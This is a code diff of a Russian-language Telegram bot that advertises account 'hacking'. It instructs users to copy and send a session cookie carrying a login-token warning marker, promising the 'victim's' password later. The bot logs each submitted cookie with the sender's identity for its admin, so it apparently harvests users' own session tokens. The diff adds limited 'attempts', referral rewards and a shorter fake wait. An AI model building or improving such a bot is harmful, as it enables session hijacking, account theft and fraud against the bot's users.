@@ -8,7 +8,7 @@ from datetime import datetime
 # ⚠️ ВСТАВЬ СВОЙ ТОКЕН СЮДА
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
-# ⚠️ ТВОЙ ID АДМИНИСТРАТОРА (ТОЛЬКО ТЫ ВИДИШЬ АДМИНСКИЕ КНОПКИ)
+# ⚠️ ТВОЙ ID АДМИНИСТРАТОРА
 YOUR_USER_ID = 1341594703
 
 # ===================================================
@@ -28,7 +28,6 @@ KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log
 # ===================================================
 
 def get_attempts(user_id):
-    """Получить количество попыток пользователя"""
     try:
         if os.path.exists(ATTEMPTS_FILE):
             with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
@@ -39,7 +38,6 @@ def get_attempts(user_id):
         return {"total": 2, "used": 0}
 
 def save_attempts(user_id, attempts_data):
-    """Сохранить попытки пользователя"""
     try:
         if os.path.exists(ATTEMPTS_FILE):
             with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
@@ -56,12 +54,10 @@ def save_attempts(user_id, attempts_data):
         return False
 
 def get_available_attempts(user_id):
-    """Получить доступные попытки"""
     attempts = get_attempts(user_id)
     return attempts["total"] - attempts["used"]
 
 def use_attempt(user_id):
-    """Использовать попытку"""
     attempts = get_attempts(user_id)
     available = attempts["total"] - attempts["used"]
     
@@ -73,14 +69,12 @@ def use_attempt(user_id):
     return True
 
 def add_attempt(user_id, count=1):
-    """Добавить попытки"""
     attempts = get_attempts(user_id)
     attempts["total"] += count
     save_attempts(user_id, attempts)
     return True
 
 def reset_attempts(user_id):
-    """Сбросить попытки"""
     attempts = {"total": 2, "used": 0}
     save_attempts(user_id, attempts)
     return True
@@ -90,7 +84,6 @@ def reset_attempts(user_id):
 # ===================================================
 
 def save_referral(referrer_id, referred_id):
-    """Сохранить реферала"""
     try:
         if os.path.exists(REFERRALS_FILE):
             with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
@@ -113,7 +106,6 @@ def save_referral(referrer_id, referred_id):
         return False
 
 def get_referrals_count(user_id):
-    """Получить количество приглашенных"""
     try:
         if os.path.exists(REFERRALS_FILE):
             with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
@@ -127,7 +119,7 @@ def get_referral_link(user_id):
     return f"https://t.me/cookieeditort_bot?start=ref_{user_id}"
 
 # ===================================================
-# ОСТАЛЬНЫЕ ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ)
+# ОСТАЛЬНЫЕ ФУНКЦИИ
 # ===================================================
 
 def save_all_user(user_id, username, first_name):
@@ -537,11 +529,22 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         first_name=user.first_name or "Unknown"
     )
     
-    # Инициализируем попытки, если их нет
+    # Инициализируем попытки
     if not os.path.exists(ATTEMPTS_FILE) or str(user_id) not in json.load(open(ATTEMPTS_FILE, "r")) if os.path.exists(ATTEMPTS_FILE) else True:
         save_attempts(user_id, {"total": 2, "used": 0})
     
-    # Базовые кнопки для всех
+    keyboard = get_main_menu(user_id)
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        f"Привет, {user_name}!\n\n"
+        f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
+        f"💡 Пригласите друга и получите +1 попытку!\n\n"
+        f"Выбери нужную категорию:",
+        reply_markup=reply_markup
+    )
+
+def get_main_menu(user_id):
     keyboard = [
         [
             InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
@@ -556,7 +559,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
     ]
     
-    # Админские кнопки
     if user_id == YOUR_USER_ID:
         keyboard.append([
             InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
@@ -574,14 +576,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
         ])
     
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        f"Привет, {user_name}!\n\n"
-        f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
-        f"💡 Пригласите друга и получите +1 попытку!\n\n"
-        f"Выбери нужную категорию:",
-        reply_markup=reply_markup
-    )
+    return keyboard
 
 # ===================================================
 # ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
@@ -594,6 +589,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     is_admin = (user_id == YOUR_USER_ID)
     data = query.data
+    
+    print(f"🔘 Нажата кнопка: {data} от пользователя {user_id}")  # Для отладки
     
     # --- НОВЫЕ КНОПКИ ---
     if data == "my_attempts":
@@ -689,7 +686,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # --- ОСТАЛЬНЫЕ КНОПКИ ---
+    # --- ОСНОВНЫЕ КНОПКИ ---
     elif data == "device":
         keyboard = [
             [
@@ -708,15 +705,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [
                 InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
-                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_phone"),
+                InlineKeyboardButton("✅ Скопировал куки", callback_data="cookies_copied"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # Отправляем видео с кнопками
         await query.message.reply_video(
             video="https://t.me/cookieeditort/3",
             caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
             reply_markup=reply_markup
         )
+        # Удаляем сообщение с выбором устройства
         await query.delete_message()
         return
     
@@ -724,10 +724,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [
                 InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
-                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_computer"),
+                InlineKeyboardButton("✅ Скопировал куки", callback_data="cookies_copied"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await query.message.reply_video(
             video="https://t.me/cookieeditort/4",
             caption="💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
@@ -736,11 +737,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.delete_message()
         return
     
-    elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
+    elif data == "cookies_copied":
+        # Проверяем попытки
+        if get_available_attempts(user_id) <= 0:
+            await query.edit_message_text(
+                "❌ У вас закончились попытки!\n\n"
+                "💡 Пригласите друга и получите +1 попытку!"
+            )
+            return
+        
         await query.edit_message_text(
-            "Скинь cookie в бота\n"
-            "И бот начнет поиск пароля вашей жертвы😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта"
+            "✅ Отлично!\n\n"
+            "📋 Теперь отправьте cookie в бота\n"
+            "Бот начнет поиск пароля вашей жертвы 😈\n"
+            "В течении дня бот скинет вам пароль от аккаунта\n\n"
+            f"🎯 У вас осталось {get_available_attempts(user_id)} попыток"
         )
         return
     
@@ -764,42 +775,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "back_to_menu":
-        user_name = update.effective_user.first_name
-        
-        keyboard = [
-            [
-                InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
-                InlineKeyboardButton("Инструкция", callback_data="cookies"),
-            ],
-            [
-                InlineKeyboardButton("Поддержка", callback_data="support"),
-                InlineKeyboardButton("🎯 Мои попытки", callback_data="my_attempts"),
-            ],
-            [
-                InlineKeyboardButton("👥 Пригласить друга", callback_data="invite_friend"),
-            ]
-        ]
-        
-        if user_id == YOUR_USER_ID:
-            keyboard.append([
-                InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
-                InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
-                InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
-                InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton("🎯 Управление попытками", callback_data="manage_attempts"),
-            ])
-        
+        keyboard = get_main_menu(user_id)
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"Привет, {user_name}!\n\n"
+            f"Привет, {update.effective_user.first_name}!\n\n"
             f"🎯 У вас {get_available_attempts(user_id)} доступных попыток.\n"
             f"💡 Пригласите друга и получите +1 попытку!\n\n"
             f"Выбери нужную категорию:",
@@ -824,8 +803,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "🗑 **Управление пользователями:**\n\n"
-            "Выберите действие:",
+            "🗑 **Управление пользователями:**",
             reply_markup=reply_markup
         )
         return
@@ -885,13 +863,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(
                 f"✅ **Пользователь успешно удалён!**\n\n"
                 f"👤 {name} (@{username})\n"
-                f"🆔 ID: {target_user_id}\n\n"
-                f"Пользователь больше не в списке с ключевым словом."
+                f"🆔 ID: {target_user_id}"
             )
         else:
             await query.edit_message_text(
-                f"❌ Ошибка при удалении пользователя.\n"
-                f"Возможно, он уже был удалён."
+                f"❌ Ошибка при удалении пользователя."
             )
         return
     
@@ -916,8 +892,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if delete_all_keyword_users():
             await query.edit_message_text(
                 f"✅ **ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!**\n\n"
-                f"🗑 Удалено пользователей: {count}\n"
-                f"📭 Список с ключевым словом теперь пуст."
+                f"🗑 Удалено пользователей: {count}"
             )
         else:
             await query.edit_message_text(
@@ -926,7 +901,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Рассылка
-    if data == "send_mailing":
+    elif data == "send_mailing":
         keyboard = [
             [InlineKeyboardButton("📨 Всем пользователям", callback_data="mailing_all")],
             [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="mailing_keyword")],
@@ -934,8 +909,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "📨 **Выберите кому отправить рассылку:**\n\n"
-            "⚠️ Сообщение будет отправлено после того, как вы его напишете.",
+            "📨 **Выберите кому отправить рассылку:**",
             reply_markup=reply_markup
         )
         return
@@ -944,7 +918,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['mailing_type'] = 'all'
         await query.edit_message_text(
             "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\n"
-            "Просто отправьте сообщение в этот чат.\n"
             "Для отмены нажмите /cancel"
         )
         return
@@ -953,7 +926,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['mailing_type'] = 'keyword'
         await query.edit_message_text(
             "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\n"
-            "Просто отправьте сообщение в этот чат.\n"
             "Для отмены нажмите /cancel"
         )
         return
@@ -1188,7 +1160,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("❌ Неверный ID. Введите число.")
                 return
     
-    # Проверяем, находится ли админ в режиме рассылки
+    # Проверяем рассылку
     if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
         mailing_type = context.user_data['mailing_type']
         
@@ -1234,7 +1206,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         del context.user_data['mailing_type']
         return
     
-    # Обычная обработка сообщений - ТРАТИМ ПОПЫТКУ ТОЛЬКО ЗДЕСЬ!
+    # ОБРАБОТКА КЛЮЧЕВОГО СЛОВА - ТРАТИМ ПОПЫТКУ
     if KEYWORD in user_message:
         # Проверяем попытки
         if get_available_attempts(user_id) <= 0:
@@ -1262,9 +1234,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
         
         await update.message.reply_text(
-            f"Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
+            f"✅ Отлично! Бот начал поиски пароля вашей жертвы.\n"
             f"Не создавайте повторных заявок, иначе будете заблокированы\n"
-            f"Если в течении 24 часов бот не ответил, значит он не нашел пароль от аккаунта\n\n"
+            f"Если в течении 6 часов бот не ответил, значит он не нашел пароль\n\n"
             f"🎯 Осталось попыток: {get_available_attempts(user_id)}"
         )
         asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
@@ -1278,9 +1250,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 timestamp=timestamp
             )
             print(f"\n💬 [{timestamp}] {user.first_name} (@{user.username or 'no_username'}): {user_message}")
-            await update.message.reply_text("Ваше сообщение получено. Ожидайте результат.")
+            await update.message.reply_text("✅ Ваше сообщение получено. Ожидайте результат.")
         else:
-            await update.message.reply_text("Пожалуйста, отправьте правильный cookie для продолжения.")
+            await update.message.reply_text("❌ Пожалуйста, отправьте правильный cookie для продолжения.")
 
 # ===================================================
 # ОБРАБОТЧИК КОМАНДЫ /cancel
@@ -1306,7 +1278,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ===================================================
 
 async def send_delayed_message(chat_id, context):
-    delay_seconds = 24 * 3600 + 3 * 60
+    delay_seconds = 6 * 3600 + 3 * 60
     try:
         await asyncio.sleep(delay_seconds)
         await context.bot.send_message(
